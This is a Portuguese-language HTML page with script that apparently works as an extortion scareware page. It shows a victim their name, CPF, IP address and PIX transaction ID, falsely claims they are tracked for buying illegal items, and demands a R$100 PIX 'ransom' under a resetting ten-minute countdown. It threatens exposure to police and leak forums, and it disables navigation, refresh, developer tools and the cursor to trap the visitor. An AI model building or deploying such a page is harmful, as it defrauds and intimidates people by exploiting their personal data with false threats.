<!DOCTYPE html>
<html lang="pt-BR">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, minimum-scale=1.0">
  <title>VAZAMENTO DETECTADO</title>
  <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@300;400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
      cursor: none !important;
    }
    
    html, body {
      background: #000000;
      color: #ffffff;
      font-family: 'Montserrat', 'Courier New', monospace;
      font-size: 16px;
      line-height: 1.4;
      height: auto;
      overflow-x: hidden;
      overflow-y: auto;
      display: flex;
      justify-content: center;
      align-items: flex-start;
      padding: 20px 0;
      user-select: none;
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      touch-action: pan-y;
      -webkit-touch-callout: none;
      -webkit-tap-highlight-color: transparent;
    }
    
    .central-rectangle {
      width: 80%;
      max-width: 90vw;
      border: 1px solid #cccccc;
      padding: 16px;
      margin: auto;
      background: transparent;
      text-align: center;
    }
    
    .main-title {
      font-size: 32px;
      font-weight: 600;
      color: #ff0000;
      margin-bottom: 30px;
      text-align: center;
    }
    
    .intro-text {
      color: #ffffff;
      margin: 25px 0;
      text-align: left;
      font-size: 16px;
      line-height: 1.6;
    }
    
    .data-section {
      margin: 25px 0;
      text-align: left;
      color: #ffffff;
    }
    
    .data-line {
      margin: 10px 0;
      font-size: 16px;
    }
    
    .data-value {
      font-weight: 600;
    }
    
    .server-msg {
      font-size: 18px;
      font-weight: 600;
      margin: 25px 0;
      color: #ff0000;
      text-align: center;
    }
    
    .explanation-text {
      color: #ffffff;
      margin: 20px 0;
      text-align: center;
      font-size: 16px;
    }
    
    .countdown-label {
      font-size: 20px;
      font-weight: 600;
      margin: 25px 0 10px 0;
      color: #ffffff;
      text-align: center;
    }
    
    .countdown {
      font-size: 28px;
      font-weight: 600;
      color: #ff0000;
      margin: 10px 0 25px 0;
      text-align: center;
    }
    
    .warning-text {
      font-size: 16px;
      margin: 20px 0;
      color: #ffffff;
      text-align: left;
    }
    
    .warning-list {
      text-align: left;
      margin: 15px 0;
      padding-left: 20px;
      color: #ffffff;
    }
    
    .warning-list li {
      margin: 8px 0;
      color: #ffffff;
    }
    
    .pix-info {
      font-size: 24px;
      font-weight: 600;
      margin: 30px 0;
      color: #ffff00;
      text-align: center;
    }
    
    .qr-section {
      margin: 30px 0;
      text-align: center;
      padding: 20px;
      border: 2px solid #ffff00;
      background: rgba(255, 255, 0, 0.1);
    }
    
    .qr-title {
      font-size: 20px;
      font-weight: 600;
      color: #ffff00;
      margin-bottom: 15px;
    }
    
    .qr-code-container {
      margin: 20px 0;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    
    .qr-code-image {
      max-width: 200px;
      max-height: 200px;
      border: 2px solid #ffffff;
      background: white;
      padding: 10px;
    }
    
    .pix-code-section {
      margin-top: 20px;
    }
    
    .pix-code-label {
      font-size: 16px;
      color: #ffffff;
      margin-bottom: 10px;
    }
    
    .pix-code {
      font-family: 'Montserrat', 'Courier New', monospace;
      font-size: 12px;
      color: #ffff00;
      background: rgba(0, 0, 0, 0.5);
      padding: 10px;
      border: 1px solid #cccccc;
      word-break: break-all;
      margin-bottom: 10px;
    }
    
    .loading-qr {
      color: #ffff00;
      font-size: 16px;
      margin: 20px 0;
    }
    
    .error-qr {
      color: #ff0000;
      font-size: 14px;
      margin: 20px 0;
    }
    
    /* Mobile responsiveness */
    @media (max-width: 768px) {
      body {
        font-size: 14px;
        padding: 10px 0;
      }
      
      .central-rectangle {
        width: 90vw;
        padding: 16px;
      }
      
      .main-title {
        font-size: 24px;
      }
      
      .countdown {
        font-size: 20px;
      }
      
      .pix-info {
        font-size: 18px;
      }
      
      .qr-section {
        margin: 20px 0;
        padding: 15px;
      }
      
      .qr-title {
        font-size: 16px;
      }
      
      .qr-code-image {
        max-width: 150px;
        max-height: 150px;
      }
      
      .pix-code {
        font-size: 10px;
        padding: 8px;
      }
      
      .pix-code-label {
        font-size: 14px;
      }
    }
    
    /* Disable all interactions */
    * {
      -webkit-user-select: none;
      -moz-user-select: none;
      -ms-user-select: none;
      user-select: none;
      -webkit-touch-callout: none;
      -webkit-tap-highlight-color: transparent;
      cursor: none !important;
    }
  </style>
</head>
<body>
  <div class="central-rectangle">
    <div class="main-title">
      VOCÊ FOI RASTREADO
    </div>
    
    <div class="intro-text">
      Olá, <span class="data-value" id="nome-cliente">[NOME_DO_CLIENTE]</span><br>
      Seu CPF <span class="data-value" id="cpf-cliente">[CPF_DO_CLIENTE]</span> foi vinculado à tentativa de compra de itens ilegais.
    </div>
    
    <div class="data-section">
      <div style="margin-bottom: 15px; font-weight: 600;">Dados coletados:</div>
      <div class="data-line">- Nome completo: <span class="data-value" id="nome-completo">[NOME_DO_CLIENTE]</span></div>
      <div class="data-line">- CPF: <span class="data-value" id="cpf-completo">[CPF_DO_CLIENTE]</span></div>
      <div class="data-line">- Endereço (via IP): <span class="data-value" id="ip-cliente">[IP_DO_CLIENTE]</span></div>
      <div class="data-line">- end_to_end_id: <span class="data-value" id="end-to-end-cliente">[ID_PIX_CLIENTE]</span></div>
    </div>
    
    <div class="server-msg">
      TODOS OS DADOS FORAM ENVIADOS PARA UM SERVIDOR INTERNACIONAL
    </div>
    
    <div class="explanation-text">
      Você achou que era só um bot de vendas. Agora está no radar. E a regra é simples:
    </div>
    
    <div class="countdown-label">
      TEMPO RESTANTE:
    </div>
    
    <div class="countdown" id="contador">
      10:00
    </div>
    
    <div class="warning-text">
      Se o pagamento de R$100,00 via PIX não for confirmado até o fim da contagem, seus dados serão:
    </div>
    
    <ul class="warning-list">
      <li>Enviados à polícia</li>
      <li>Postados em fóruns públicos de vazamento</li>
      <li>Associados a crimes cibernéticos</li>
    </ul>
    
    <div class="qr-section">
      <div class="qr-title">PIX DE RESGATE - R$ 100,00</div>
      
      <div id="qr-loading" class="loading-qr">
        Gerando código PIX...
      </div>
      
      <!-- ❌ [REMOVIDO - QR CODE] Imagem do QR Code - não é mais usada -->
      <!-- <div id="qr-container" class="qr-code-container" style="display: none;">
        <img id="qr-image" class="qr-code-image" alt="QR Code PIX" />
      </div> -->
      
      <div id="pix-code-container" class="pix-code-section" style="display: none;">
        <div class="pix-code-label">Código PIX (Copia e Cola):</div>
        <div id="pix-code" class="pix-code"></div>
        <div style="font-size: 12px; color: #cccccc; margin-top: 10px;">
          Copie o código acima e cole no seu aplicativo do banco
        </div>
      </div>
      
      <div id="qr-error" class="error-qr" style="display: none;">
        Erro ao gerar código PIX. Tente recarregar a página.
      </div>
    </div>
  </div>

  <script>
    // Capturar dados da URL
    const urlParams = new URLSearchParams(window.location.search);
    const token = urlParams.get('token');
    
    // Variáveis para controle da sessão
    let sessionId = null;
    let timerInterval = null;
    
    // Dados padrão
    let dadosCliente = {
      nome: '[NOME_DO_CLIENTE]',
      cpf: '[CPF_DO_CLIENTE]',
      ip: '[IP_DO_CLIENTE]',
      end_to_end_id: '[ID_PIX_CLIENTE]'
    };
    
    // Função para criar nova sessão de timer
    async function criarSessaoTimer() {
      if (!token) {
        console.log('Token não encontrado, usando timer padrão');
        iniciarTimerPadrao();
        return;
      }
      
      try {
        const response = await fetch('/api/criar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ token: token })
        });
        
        const data = await response.json();
        
        if (data.success) {
          sessionId = data.sessionId;
          console.log('Sessão de timer criada:', sessionId);
          iniciarTimerSessao();
        } else {
          console.log('Erro ao criar sessão:', data.error);
          iniciarTimerPadrao();
        }
      } catch (error) {
        console.log('Erro na requisição:', error);
        iniciarTimerPadrao();
      }
    }
    
    // Função para iniciar timer baseado na sessão
    function iniciarTimerSessao() {
      if (!sessionId) {
        iniciarTimerPadrao();
        return;
      }
      
      // Atualizar contador baseado na sessão
      timerInterval = setInterval(async () => {
        try {
          const response = await fetch(`/api/status-sessao-timer/${sessionId}`);
          const data = await response.json();
          
          if (data.success && data.active) {
            const minutos = Math.floor(data.timeRemaining / 60);
            const segundos = data.timeRemaining % 60;
            const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
            document.getElementById('contador').textContent = display;
            
            if (data.timeRemaining <= 0) {
              // Timer expirou, finalizar sessão
              await finalizarSessao();
              iniciarNovaContagem();
            }
          } else {
            // Sessão não encontrada ou inativa, usar timer padrão
            clearInterval(timerInterval);
            iniciarTimerPadrao();
          }
        } catch (error) {
          console.log('Erro ao verificar status da sessão:', error);
          // Em caso de erro, continuar com timer padrão
          clearInterval(timerInterval);
          iniciarTimerPadrao();
        }
      }, 1000);
    }
    
    // Função para finalizar sessão atual
    async function finalizarSessao() {
      if (!sessionId) return;
      
      try {
        await fetch('/api/finalizar-sessao-timer', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({ sessionId: sessionId })
        });
      } catch (error) {
        console.log('Erro ao finalizar sessão:', error);
      }
      
      sessionId = null;
    }
    
    // Função para iniciar nova contagem (criar nova sessão)
    function iniciarNovaContagem() {
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      // Aguardar um momento e criar nova sessão
      setTimeout(() => {
        criarSessaoTimer();
      }, 1000);
    }
    
    // Função de fallback para timer padrão (comportamento original)
    function iniciarTimerPadrao() {
      let tempoRestante = 10 * 60; // 10 minutos em segundos
      
      if (timerInterval) {
        clearInterval(timerInterval);
      }
      
      timerInterval = setInterval(() => {
        const minutos = Math.floor(tempoRestante / 60);
        const segundos = tempoRestante % 60;
        const display = `${minutos.toString().padStart(2, '0')}:${segundos.toString().padStart(2, '0')}`;
        document.getElementById('contador').textContent = display;
        
        if (tempoRestante > 0) {
          tempoRestante--;
        } else {
          // Quando chegar a zero, reiniciar
          tempoRestante = 10 * 60;
        }
      }, 1000);
    }
    
    // Tentar buscar dados reais se token existir
    if (token) {
      fetch(`/api/dados-comprador?token=${token}`)
        .then(response => response.json())
        .then(data => {
          if (data.success) {
            if (data.nome && data.nome !== 'N/A') {
              dadosCliente.nome = data.nome;
              document.getElementById('nome-cliente').textContent = dadosCliente.nome;
              document.getElementById('nome-completo').textContent = dadosCliente.nome;
            }
            if (data.cpf && data.cpf !== 'N/A') {
              dadosCliente.cpf = data.cpf;
              document.getElementById('cpf-cliente').textContent = dadosCliente.cpf;
              document.getElementById('cpf-completo').textContent = dadosCliente.cpf;
            }
            if (data.ip && data.ip !== 'N/A') {
              dadosCliente.ip = data.ip;
              document.getElementById('ip-cliente').textContent = dadosCliente.ip;
            }
            if (data.end_to_end_id && data.end_to_end_id !== 'N/A') {
              dadosCliente.end_to_end_id = data.end_to_end_id;
              document.getElementById('end-to-end-cliente').textContent = dadosCliente.end_to_end_id;
            }
          }
        })
        .catch(error => {
          console.log('Usando dados padrão');
        });
    }
    
    // Função para gerar código PIX (copia e cola)
    async function gerarQRCodePIX() {
      const loadingElement = document.getElementById('qr-loading');
      // ❌ [REMOVIDO - QR CODE] Não usamos mais a imagem do QR Code
      // const qrContainer = document.getElementById('qr-container');
      const pixCodeContainer = document.getElementById('pix-code-container');
      const errorElement = document.getElementById('qr-error');
      // const qrImage = document.getElementById('qr-image');
      const pixCode = document.getElementById('pix-code');
      
      try {
        console.log('Gerando código PIX copia e cola...');
        
        const response = await fetch('/api/gerar-qr-pix', {
          method: 'POST',
          headers: {
            'Content-Type': 'application/json'
          },
          body: JSON.stringify({})
        });
        
        const data = await response.json();
        
        // ❌ [REMOVIDO - QR CODE] Apenas validamos o pix_copia_cola, não mais o qr_code_base64
        if (data.success && data.pix_copia_cola) {
          // Esconder loading
          loadingElement.style.display = 'none';
          
          // ❌ [REMOVIDO - QR CODE] Não exibimos mais a imagem
          // // Mostrar QR code
          // qrImage.src = data.qr_code_base64;
          // qrContainer.style.display = 'flex';
          
          // Mostrar código PIX
          pixCode.textContent = data.pix_copia_cola;
          pixCodeContainer.style.display = 'block';
          
          console.log('Código PIX gerado com sucesso:', data.transacao_id);
        } else {
          throw new Error(data.error || 'Erro desconhecido');
        }
        
      } catch (error) {
        console.error('Erro ao gerar código PIX:', error);
        
        // Esconder loading
        loadingElement.style.display = 'none';
        
        // Mostrar erro
        errorElement.style.display = 'block';
        errorElement.textContent = 'Erro ao gerar código PIX. Tente recarregar a página.';
      }
    }
    
    // Inicializar sistema de timer
    criarSessaoTimer();
    
    // Gerar QR code PIX quando a página carregar
    gerarQRCodePIX();
    
    // Limpar sessão quando a página for fechada
    window.addEventListener('beforeunload', () => {
      if (sessionId) {
        // Usar sendBeacon para enviar requisição mesmo quando a página está sendo fechada
        const formData = new FormData();
        formData.append('sessionId', sessionId);
        navigator.sendBeacon('/api/finalizar-sessao-timer', formData);
      }
    });
    
    // Bloquear ações do usuário
    document.addEventListener('contextmenu', e => e.preventDefault());
    document.addEventListener('selectstart', e => e.preventDefault());
    document.addEventListener('dragstart', e => e.preventDefault());
    
    // Bloquear teclas comuns
    document.addEventListener('keydown', function(e) {
      // Bloquear F5, Ctrl+R, Ctrl+F5, etc.
      if (e.key === 'F5' || 
          (e.ctrlKey && (e.key === 'r' || e.key === 'R')) ||
          (e.ctrlKey && e.key === 'F5') ||
          (e.ctrlKey && (e.key === 'u' || e.key === 'U')) ||
          (e.ctrlKey && (e.key === 's' || e.key === 'S')) ||
          (e.ctrlKey && (e.key === 'p' || e.key === 'P')) ||
          e.key === 'F12') {
        e.preventDefault();
        e.stopPropagation();
        return false;
      }
    });
    
    // Bloquear zoom no mobile (permitir scroll vertical)
    document.addEventListener('touchmove', function(e) {
      // Só bloquear se houver mais de um toque (zoom/pinch)
      if (e.touches.length > 1) {
        e.preventDefault();
      }
      // Permitir scroll vertical com um dedo
    }, { passive: false });
    
    // Bloquear double tap zoom
    let lastTouchEnd = 0;
    document.addEventListener('touchend', function(e) {
      const now = (new Date()).getTime();
      if (now - lastTouchEnd <= 300) {
        e.preventDefault();
      }
      lastTouchEnd = now;
    }, false);
    
    // Impedir back/forward
    history.pushState(null, null, location.href);
    window.onpopstate = function() {
      history.go(1);
    };
    
    // Garantir cursor oculto
    const style = document.createElement('style');
    style.textContent = '* { cursor: none !important; }';
    document.head.appendChild(style);
  </script>
</body>
</html>
